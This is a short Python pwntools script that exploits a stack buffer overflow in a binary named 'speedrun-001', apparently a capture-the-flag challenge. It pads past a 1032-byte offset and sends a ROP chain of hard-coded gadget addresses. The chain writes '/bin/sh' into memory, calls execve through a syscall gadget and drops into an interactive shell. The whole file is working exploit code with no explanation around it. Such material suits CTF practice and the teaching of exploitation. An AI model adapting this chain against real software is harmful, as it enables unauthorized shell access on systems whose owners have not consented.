
from pwn import *

# ------ Setup ------
# -------------------

io = process('./speedrun-001')
#io = gdb.debug('./speedrun-001')

# ---- Variables ----
# -------------------

offset = 1032

padding = b"A"*offset #(offset - len(nops) - len(shellcode_64))

# rop chain variables

popRAX = p64(0x415664) #: pop rax ; ret
popRDI = p64(0x400686) #: pop rdi ; ret
popRSI = p64(0x4101f3) #: pop rsi ; ret
popRDX = p64(0x44be16) #: pop rdx ; ret

execve = p64(0x3b)

write_gadget = p64(0x48d251) #: mov qword ptr [rax], rdx ; ret
write_address = p64(0x6b6000)
syscall = p64(0x40129c) #: syscall

# rop chain
# write /bin/sh
rop = b""
rop += popRDX
rop += b"/bin/sh\x00"
rop += popRAX
rop += write_address
rop += write_gadget

# setup syscall
rop += popRAX
rop += execve

rop += popRDI
rop += write_address

rop += popRSI
rop += p64(0)
rop += popRDX
rop += p64(0)

rop += syscall

payload = padding + rop

# -- Exploit Start --
# -------------------


io.readuntil(b"Any last words?")
io.send(payload)

io.interactive()
